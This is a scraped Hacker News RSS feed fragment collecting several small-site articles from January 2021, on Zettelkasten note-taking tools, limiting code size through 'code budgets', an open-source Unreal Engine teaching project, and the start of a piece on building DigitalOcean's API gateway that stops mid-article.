<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610858996126/xJu3di8Te.png?auto=compress" alt="Screenshot 2021-01-17 at 10.17.42 AM.png"></p>
<p>And If you REALLY liked the article, consider <a target="_blank" href="https://ko-fi.com/luciferreeves">buying me a coffee</a> 😊. If you have any suggestions or feedback, feel free to let me know that in the comments. </p>
<p><strong><em>Happy Programming!</em></strong></p>
<p><a target="_blank" href="https://twitter.com/LuciferCReeves?ref_src=twsrc%5Etfw"><img src="https://img.shields.io/twitter/follow/LuciferCReeves?label=Follow%20Me%20on%20Twitter&amp;logo=twitter&amp;style=for-the-badge&amp;labelColor=00acee&amp;logoColor=fff" alt="Twitter Follow"></a> <a target="_blank" href="https://github.com/luciferreeves"><img src="https://img.shields.io/github/followers/luciferreeves?label=Follow%20me%20on%20github&amp;logo=github&amp;style=for-the-badge" alt="GitHub followers"></a></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803288</guid>
            <pubDate>Sat, 16 Jan 2021 16:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Second Brain – Zettelkasten]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 94 (<a href="https://news.ycombinator.com/item?id=25802277">thread link</a>) | @spences10
<br/>
January 16, 2021 | https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/ | <a href="https://web.archive.org/web/*/https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section></section><section><small><a href="https://scottspence.com/tags/habits">habits</a></small><small><a href="https://scottspence.com/tags/notes">notes</a></small><small><a href="https://scottspence.com/tags/vscode">vscode</a></small><small><a href="https://scottspence.com/tags/resource">resource</a></small><small><a href="https://scottspence.com/tags/tools">tools</a></small></section><p>For as long as I have been learning web development (<span>over 4 years</span>) I have been taking notes. Partly notes to help
clarify my understanding of something and partly for future me.</p><p>That’s why I have my <a href="https://scottspence.com/garden" target="_blank" rel="noopener">digital garden</a>, an online collection of my
learning over the years.</p><p>What is in my garden is not the full extent of the notes I have taken
however, there’s partly formed musings and one-liners that will help
me if I ever come across this one particular thing which took a while
to fix/resolve in the past.</p><p>Stuff like that doesn’t really warrant going into a post so I have
<a href="https://cheatsheets.xyz/" target="_blank" rel="noopener">Cheat Sheets</a> where that will get added to and grouped with the
relevant information.</p><p>It’s not been until recently that I have come to learn of the
<a href="https://zettelkasten.de/" target="_blank" rel="noopener">Zettelkasten</a> method, which translates from German to note box.</p><p>With tools like RoamResearch and Notion gaining popularity and me
using many of them I’ve decided to make some notes on my opinions of
what I have been using over the years.</p><h2 id="cliffstldr"><a href="#cliffstldr" aria-label="cliffstldr permalink"></a>Cliffs/TL;DR</h2><p>I’m using a mixture of Foam and Obsidian with my data exported from
RoamResearch and Notion which I now use in a private GitHub repo that
I’m in full control of.</p><h2 id="github"><a href="#github" aria-label="github permalink"></a>GitHub</h2><p>GitHub is where it all began for me, with git being a particular
sticking point with a lot of commands that were all pretty alien at
the time so I started adding the commands <a href="https://gist.github.com/spences10/5c492e197e95158809a83650ff97fc3a" target="_blank" rel="noopener">to a gist</a> which has a
history going back to <a href="https://gist.github.com/spences10/5c492e197e95158809a83650ff97fc3a/revisions?page=2#diff-0517f094a4805e87e00d10b2891d99e4" target="_blank" rel="noopener">the start of 2017</a>.</p><p>As this list started to grow I also had other areas that I needed to
keep these little one-liners to hand, git being the largest but other
things like <a href="https://cheatsheets.xyz/mac/#screen-snip" target="_blank" rel="noopener">how to screen snip</a> on macOS and <a href="https://cheatsheets.xyz/bash/#kill-process-on-port" target="_blank" rel="noopener">kill a process</a> with
bash, all started adding up.</p><p>I moved them all into <a href="https://github.com/spences10/cheat-sheets" target="_blank" rel="noopener">one repository</a> for ease of access for me.
These later were added to <a href="https://cheatsheets.xyz/" target="_blank" rel="noopener">Cheat Sheets</a>.xyz</p><h2 id="notion"><a href="#notion" aria-label="notion permalink"></a>Notion</h2><p>Back when Notion was the new hotness and I jumped onto it as soon as a
discovered how flexable it was and more importantly cross platform, so
I could take notes on my phone, work laptop and personal computer yay
🎉</p><p>I used it for stashing ideas for later, todo lists, shopping lists,
kanban boards and the 100s of links that I thought looked interesting
but didn’t have time to read it there and then so stashed them in the
Notion links database (never to be seen again 🤣).</p><p>Downsides, the search wasn’t great, that’s been improved in recent
iterations but was quite annoying when you wanted to find something
quickly.</p><p>The Android version just straight up stopped working, I couldn’t use
it and the general feeling from Notion was meh!</p><p>I learned the hard way about differing Markdown versions with this too
after making a 8k word post in Notion then copy pasting into VSCode to
find all the artifacts for code snippets and word formatting
throughout.</p><p>Getting my data out of Notion was straightforward enough but what I
was left with was a but of a mess. Because of the nesting you were
able to do with pages in pages the export was a mess of files with
hashes appended to them which is going to take a while to untangle.</p><h2 id="roamresearch"><a href="#roamresearch" aria-label="roamresearch permalink"></a>RoamResearch</h2><p>Roam RoamResearch was a different way of logging notes, the default
was to open you on a daily notes view where you’d add your notes and
you could then move these into more long form documents with the help
of the graph behind it which helped you link information with
backlinks (<code>[[example backlink]]</code>) with the intention of helping you
collate information from differing sources.</p><p>The odd bit was that you could only add in a bullet fashion, so if you
want to add a code block it always looked weird inline of a unordered
list.</p><p>It got a bit weird and culty, I always get a bit wary when companies
start referring to their users/employees as tribes, “Roamers”,
“Googlers”, no thanks.</p><p>That along with starting it and staring at the rotating logo for an
age waiting for it to start, not helpful when you want to take a note
quickly.</p><p>Getting my data out of there was a straightforward button click
though.</p><h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2><p>Obsidian, the free (or one off licence payment) offering that is a
standalone app, much like Notion (which I know is web based too)
available on macOS, Windows and Linux.</p><p>The idea is that the notes you take are hosted locally on your
machine, no central storage location like with Notion and
RoamResearch.</p><p>With Obsidian you are in direct control of the Markdown, store it
wherever you like.</p><p>This brings up questions about how and where you store your data, I’ve
now added all the exports from Notion and RoamResearch to a git
repository which is on a private GitHub repo.</p><p>This is nice, there’s an import option for Roam exports, you can
configure your daily notes location and it has a super nice graph
view.</p><p>This experience felt a lot like working in VSCode, but it wasn’t
VSCode! 😬</p><p>I’m very comfortable with editing Markdown in VSCode and felt a bit
cheated when I couldn’t select a tab or move lines around.</p><h2 id="foam"><a href="#foam" aria-label="foam permalink"></a>Foam</h2><p>So, Foam! <a href="https://github.com/foambubble/foam" target="_blank" rel="noopener">Foam is a VSCode extension</a> that enables the features of
Obsidian but with the editing power of VSCode, so no brainier, right?</p><p>Foam are the first to admit that <a href="https://foambubble.github.io/foam/#getting-started" target="_blank" rel="noopener">things may be a little rough</a> as
it’s still in preview. But I <em>really</em> like working with my Markdown in
VSCode so I’m prepared for the teething issues.</p><p>There’s a <a href="https://discord.gg/rtdZKgj" target="_blank" rel="noopener">super welcoming Discord</a> to join and talk to other users
and the developers.</p><p>With my new liberated data from Notion and RoamResearch I’m in the
process of working through all this data which is easy to visualise
with the VSCode file explorer and built in graph view of Foam.</p><p>The Foam graph view is still a WIP so I’m referring to Obsidian to
check that out for now.</p><p>I’m super excited following the progress of this!</p><a href="#top-of-page" aria-label="back to top navigation"><p>Back to Top</p></a></article><div><p>If you're interested in occasional updates from me about what I'm working on and want useful information you can sign up to my newsletter.</p><p>Important dev related content, directly to your inbox (for free).</p><p><span role="img" aria-label="sparkles">✨ ✨ ✨ ✨ ✨ ✨ ✨</span>I'm giving away sticker packs every Monday, Wednesday and Friday to a randomly chosen newsletter subscriber. 👇</p><p><a href="https://scottspence.com/newsletter">Newsletter signup...</a></p></div></div>]]>
            </description>
            <link>https://scottspence.com/2020/07/17/my-second-brain-zettelkasten/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802277</guid>
            <pubDate>Sat, 16 Jan 2021 14:19:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Children Strike of 1972]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25801830">thread link</a>) | @jacquesm
<br/>
January 16, 2021 | https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972 | <a href="https://web.archive.org/web/*/https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801830</guid>
            <pubDate>Sat, 16 Jan 2021 12:32:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Budgets]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25801696">thread link</a>) | @DanielBMarkham
<br/>
January 16, 2021 | https://danielbmarkham.com/code-budgets/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/code-budgets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        



        <main>



<article>
    
    <div>
    <div id="post-body">
        <p>How much does a line of code cost?</p><p>The naive answer is that it costs nothing. Bytes are free -- or as close to free as we can come. But it <em>has</em> to cost something. After all, it took time to type in, right? So that takes us to our first rule of "Code Economics": the cost of a line of code is measured in how much time we spend working with it.</p><p>How much value is in a line of code?</p><p>The naive answer is that the economic value of a line of code is the value of the application (which can be measured various ways) divided by the total line-of-codes (LOC). If you're making $10K per month from a thousand lines of code, each line is bringing in $10.</p><p>But that's obviously not true. We know that the same application can be written using a thousand, ten thousand, or a hundred thousand LOC. The thing the application does for people -- its value -- and the amount of code it takes to write it? They're not related at all. That takes us to the second rule of "Code Economics": a line of code has no value whatsoever. It only has value as part of some deployable application. The application is the smallest unit of economic value. (Actually, it's UX flow, but for our purposes today an application supports one UX flow that the user finds value interacting with.)</p><p>The value of an app is more directly measurable. Yes, sometimes it gets more complicated, like if the business purpose of the app is in-app purchases or referrals, but at some point money comes in and we can trace that money back to the app.</p><p>How about the cost of a line of code? Is it just the time we spend typing it in? That's obviously wrong. You have to design it, even if only in your head. You have to test it. You have to deploy it. In fact, once you start thinking about it, there's no limit to the amount of money you can spend on a line of code. If your app is successful, you might spend the rest of your lifetime maintaining that line of code -- looking at it every now and then, tweaking it, changing how it's used.</p><p>Of course, most lines of code either work fine or they never provide enough value to make anybody bother with them again. (No economic value = no technical debt) But, assuming you know enough to write an app that has value, each line of code in that app has an potentially-infinite cost.</p><p>So value comes in app-sized chunks while costs is related to the tiny pieces we use to make that app -- and to a large degree this is under our control.</p><p>We have a way in finance of dealing with things that have a limited value but a potentially-unlimited downside. We use a budget. I could go out next month and buy $500 worth of sugar-free bubblegum (I love the stuff), but I don't. I have a budget of $10 per month and I stick to it. That's not because bubblegum is such a huge drain on our finances. It's because little things add up. Without a budget, I have no reasonable way for my wife and I to discuss what's important to us. The budget isn't important. The conversation about values it drives is irreplaceable.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/code-budgeting-tablets.png" alt=""></figure><h3 id="so-why-aren-t-we-budgeting-our-code">So why aren't we budgeting our code?</h3><p>So far in our discussion, there's really no reason to pick one set of budget numbers over another. Should we limit our applications to a million lines of code? A hundred? We don't know. We can safely say two things. One, given the same value, more code equals more cost. Two, lines-of-code always grows out-of-control the more we poke at it. This leads to the conclusion in the third rule of Code Economics: the only way to limit the costs of solving a problem using programming is to arbitrarily limit the amount of code humans have to mentally-manipulate solving it.</p><p>In a way, this is all common sense. We've been doing it for years. We just haven't been explicit about it. Shared libraries, frameworks, industry standards, and a dozen other things all exist in an effort to limit the amount of code humans have to mentally-manipulate to solve problems.</p><p>So why haven't we succeeded? Why can't most programmers today do their job using four or five lines of code?</p><p>Because lines-of-code always grows the more we poke at it. When the http protocol first appeared, if you wanted a web page? You brought up a terminal and telnetted a small number of commands. Boom, there's your webpage. Now, there are easily 10, maybe 20 various standards and libraries related to what used to be 10 seconds of work. Fifty years from now there will be 40 standards. Same value, more code. Value stays the same, cost of code continues to increase.</p><p>I'd like to suggest a completely random rule that I just made up: <em><strong>Arbitrarily limit lines of code used to solve a problem and write the app with the goal of never touching it again</strong></em></p><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-17-16-code-budget-1.jpg" alt=""><figcaption>No matter what your tech or stack, in general, costs rise as a function of the amount of code you write and later have to maintain</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-18-51-code-budget-2.jpg" alt=""><figcaption>The application's value to the user, however, remains constant</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-19-37-code-budget-3.jpg" alt=""><figcaption>That means that there is some unknown point at which the amount of money/effort you've spent to provide the value is the same as the value it provides. Afterwards, the costs rise steeply. There is no feedback or mechanism to spot the crossover point</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-19-37-code-budget-4.jpg" alt=""><figcaption>Providing some arbitrary limits to the amount of code you're willing to create and maintain, even if it's past the break-even point, is the only way to prevent long-term runaway costs</figcaption></figure><p>Furthermore, since I'm making stuff up, how about a 2000-200-20 rule for folks writing microservices? Whatever problem you have to solve using microservices, you have 20 microservices to solve it in. Each of those microservices can be written with no more than 200 lines of unique code.</p><p>But wait, I hear you say. That's never going to work! Okay, so among all of those microservices you can have 2,000 lines of code in a shared library. Anything you could ever touch counts as code.</p><p>I'm not going to defend my made-up rules aside from saying that budgets always seem arbitrary, and it's not right to create a budget so small that the work can't get done. I don't believe I've done that here -- but I might be wrong! Use other budgets if you like. Hell if I care. But use budgets.</p><p>Most programmers probably don't think such a budget is fair, or workable. And I think it's fine. That's fascinating to me and indicates a lack of alignment somewhere in the way we train and socialize programmers.</p><p>I'm also suggesting a new thing that has to happen: a code budgeting discussion. Yes, Daniel, your WhizzBang widget is freaking awesome, but it uses 500 lines of code, and that's 500 lines we can't afford right now.</p><p>Whoa horsey! Wouldn't I love to hear somebody actually say that! Cost control, in a programming team. Imagine that! And what would come next? I have no idea!</p><p>But I could guess.</p><p>Don't some problems require a lot of code? Don't some applications -- most, in fact -- require us to come back to them again and again in order to keep them in alignment with changing user needs?</p><p>Both statements are true. For complex things, we write components. Those components have executing tests that describe them and are used/shared in multiple places. The more they are used/shared, the better they get. That means that components are just another project. It also means that if you don't have multiple teams using your component, you don't have a component. Component creation should be a decision made between teams and involve a completely new project. After all, they have both cost and value.</p><p>What about coming back to tweak the app as the business needs change? Assuming you have a release that is currently demonstrating value -- a big assumption, by the way -- I think you have to timebox it. Three months of verifying that the app got things mostly right. After that? You write a new app, of course. With the budget we're talking about it's not going to be a huge effort, you've already been living in this space, and it's good to rethink things. Code budgets and timelines prevent <a href="https://en.wikipedia.org/wiki/Second-system_effect">Second System Syndrome</a>. (I think we went off-the-rails somewhere with Second System Syndrome, but I digress)</p><p>There are parts of this essay that are completely made-up. I tried to point those out. There are also parts that are built on decades of experience both coding solutions and watching teams work. What I've seen over-and-over again is that really cool things happen with smart people and creative constraints. Really stupid stuff happens otherwise, because without constraints it's all <a href="https://en.wikipedia.org/wiki/Law_of_triviality">bike shedding</a>.</p><p>You need to start budgeting your code.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/Daniel-Signature.png" alt=""></figure>    </div>
</div>

</article>










</main>

            </div><div>
        <p><span>🎉</span> You've successfully subscribed to Nerd Ducks!
        </p><p>OK</p>
    </div></div>]]>
            </description>
            <link>https://danielbmarkham.com/code-budgets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801696</guid>
            <pubDate>Sat, 16 Jan 2021 11:57:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New ‘Action Roguelike’ C++ Project on GitHub]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25800771">thread link</a>) | @todsacerdoti
<br/>
January 15, 2021 | https://www.tomlooman.com/action-roguelike-cpp-ue4/ | <a href="https://web.archive.org/web/*/https://www.tomlooman.com/action-roguelike-cpp-ue4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>For the <a rel="noreferrer noopener" href="https://www.tomlooman.com/stanford-cs193u/" target="_blank">Stanford University Fall 2020 Curriculum</a>, I built a small game project using mainly C++ mixed with some Blueprint in Unreal Engine. For those interested, the entire Computer Science course (CS193U) was provided through Zoom lectures and has been recorded. I’m working on getting this published and meanwhile, this project is already <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">open-source through GitHub</a> to be taken apart by anyone! </p>
<div><figure><img loading="lazy" width="900" height="490" src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1" alt="" srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" data-lazy-src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div><p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p><h2>Description</h2>
<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I’m sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn’t a whole lot that makes this a real ‘roguelike’ with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‘Action Roguelike’.</p>
<figure><p> <iframe title="Action Roguelike Combat Sample [Unreal Engine]" width="900" height="506" src="https://www.youtube.com/embed/8jDCtT88bdk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure>
<figure><p> <iframe title="CS193U: Blackhole Projectile Assignment Example" width="900" height="506" src="https://www.youtube.com/embed/uSOEPkX3OtI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure>
<h2>Features</h2>
<p>Below I’ve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>
<ul><li>Third-person Action Character Movement</li><li><strong>Action System</strong>&nbsp;(Gameplay Ability System-lite)<ul><li>Dash Ability (Teleporting via projectile)</li><li>Blackhole Ability</li><li>Magic Projectile Attack</li><li>“Thorns” buff (reflecting damage)</li><li>Burning Damage-over-time effect</li></ul></li><li>AttributeComponent (Health, Rage etc.)</li><li><strong>SaveGame System</strong>&nbsp;for persisting progress of character and world state.</li><li>Heavy use of Events to drive UI and gameplay reactions.</li><li>Mix of C++ &amp; Blueprint and how to combine these effectively.</li><li><strong>GameplayTags</strong> to mark-up Actors, Buffs, Actions.</li><li><strong>Multiplayer support</strong>&nbsp;for all features</li><li>GameMode Logic<ul><li>EQS for binding bot/powerup spawn locations.</li><li>Bot spawning system (bots cost points to spawn, gamemode gains points over time to spend)</li><li>DataTable holds bot information</li><li>DataAssets to hold enemy configurations</li></ul></li><li><strong>Asset Manager:</strong>&nbsp;Async loading of data assets</li><li>Async loading of UI icons</li><li>AI (Ranged Shooter style)<ul><li>Minion AI with Behavior Trees (Roam, See, Chase, Attack, Flee/Heal)</li><li>C++ Custom Behavior Trees Nodes</li><li>EQS for attack/cover locations by AI Powerups</li></ul></li><li>Powerup pickups to heal, gain credits/actions (UMG)</li><li>Main menu to host/join game (UMG)</li><li>UI elements for player attributes and projected widgets for powerups and enemy health.</li><li>C++ Localized Text Example</li></ul>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p><div><figure><img loading="lazy" width="900" height="463" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Spotted by Minion’s sight sense.</figcaption></figure></div><div><figure><a href="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?ssl=1" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img loading="lazy" width="900" height="532" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a><figcaption>Behavior Tree for Ranged Minion AI</figcaption></figure></div><h2>What’s Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors – including the final shape of the existing course recordings.</p>
</div></div>]]>
            </description>
            <link>https://www.tomlooman.com/action-roguelike-cpp-ue4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800771</guid>
            <pubDate>Sat, 16 Jan 2021 07:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean's API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25800237">thread link</a>) | @chynkm
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

